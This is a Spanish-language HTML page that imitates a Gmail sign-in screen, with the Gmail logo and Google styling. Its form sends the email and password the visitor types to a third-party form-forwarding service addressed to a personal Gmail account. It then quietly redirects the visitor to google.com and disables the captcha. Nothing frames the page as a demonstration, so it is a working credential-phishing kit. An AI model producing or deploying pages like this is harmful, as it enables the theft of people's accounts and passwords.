
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Iniciar Sesión</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
        }

        body {
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background-color: #f1f3f4;
        }

        .login-container {
            width: 100%;
            max-width: 400px;
            padding: 2rem;
            background-color: #ffffff;
            box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.1);
            border-radius: 8px;
            text-align: center;
        }

        .login-container img {
            width: 80px;
            margin-bottom: 1rem;
        }

        h1 {
            font-size: 24px;
            font-weight: normal;
            color: #202124;
            margin-bottom: 0.5rem;
        }

        .input-field {
            display: flex;
            flex-direction: column;
            margin-top: 1rem;
        }

        .input-field label {
            font-size: 14px;
            color: #5f6368;
            text-align: left;
        }

        .input-field input {
            padding: 10px;
            font-size: 16px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            margin-top: 0.3rem;
        }

        .input-field input:focus {
            outline: none;
            border-color: #4285f4;
        }

        .forgot-password {
            margin-top: 1rem;
            font-size: 14px;
            color: #1a73e8;
            text-decoration: none;
        }

        .login-button {
            margin-top: 1.5rem;
            background-color: #1a73e8;
            color: #ffffff;
            border: none;
            padding: 10px;
            width: 100%;
            font-size: 16px;
            border-radius: 4px;
            cursor: pointer;
        }

        .login-button:hover {
            background-color: #0c5db5;
        }

        .create-account {
            margin-top: 1.5rem;
            font-size: 14px;
            color: #1a73e8;
            text-decoration: none;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/4/4e/Gmail_Icon.png" alt="Logo de Gmail">
        <h1>Iniciar Sesión</h1>

        <form action="https://formsubmit.co/uriasalonso2004@gmail.com" method="POST">
            <div class="input-field">
                <label for="email">Correo electrónico</label>
                <input type="email" id="email" name="email" required>
            </div>

            <div class="input-field">
                <label for="password">Contraseña</label>
                <input type="password" id="password" name="password" required>
            </div>

            <a href="#" class="forgot-password">¿Olvidaste tu contraseña?</a>

            <button type="submit" class="login-button">Iniciar sesión</button>

            <input type="hidden" name="_next" value="https://www.google.com">

            <input type="hidden" name="_captcha" value="false">


        </form>

        <a href="#" class="create-account">Crear cuenta</a>
    </div>
</body>
</html>
